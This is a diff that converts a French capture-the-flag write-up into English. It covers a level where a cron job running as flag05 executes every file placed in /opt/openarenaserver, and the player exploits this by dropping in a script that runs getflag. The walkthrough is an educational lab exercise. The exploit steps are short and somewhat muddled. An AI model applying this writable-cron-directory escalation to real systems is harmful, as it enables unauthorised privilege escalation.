@@ -1,19 +1,27 @@
-En se connectant au level 05, le message "You have new mail" s'affiche sur la sortie standard.
-On retrouve rapidement en fouillant un peu, un dossier /rofs/var/mail qui contient un fichier level05.
-Celui correspond a un cron job :
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+## Level 05
 
-Il execute toutes les 2 minutes le script mentionne avec les droits de flag05.
-Le script en question ressemble a ceci :
+When connecting to level 05, the message "You have new mail" appears on the standard output. Upon further investigation, we find a directory `/rofs/var/mail` which contains a file named `level05`. This file corresponds to a cron job:
+
+```
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+This job runs the mentioned script every 2 minutes with `flag05`'s privileges. The script looks like this:
+
+```bash
 #!/bin/sh
 
 for i in /opt/openarenaserver/* ; do
-	(ulimit -t 5; bash -x "$i")
-	rm -f "$i"
+  (ulimit -t 5; bash -x "$i")
+  rm -f "$i"
 done
+```
 
-Il execute donc, avant de les supprimer, tous les fichiers contenus dans le chemin mentionne. Ainsi, on peut faire executer un fichier a flag05 en le placant dans ce dossier :
+It executes and deletes all the files contained in the specified directory. Therefore, we can have `flag05` execute a file by placing it in that directory. For example, use the following commands:
+
+```bash
 getflag > /tmp/flag.txt
-Puis
 chmod +x script.sh
-Au bout de 2 minutes, on ira verifier dans le chemin mentionne, et le fichier contiendra le resultat de la commande getflag.
+```
+
+After 2 minutes, we can check the directory, and the file will contain the result of the `getflag` command.
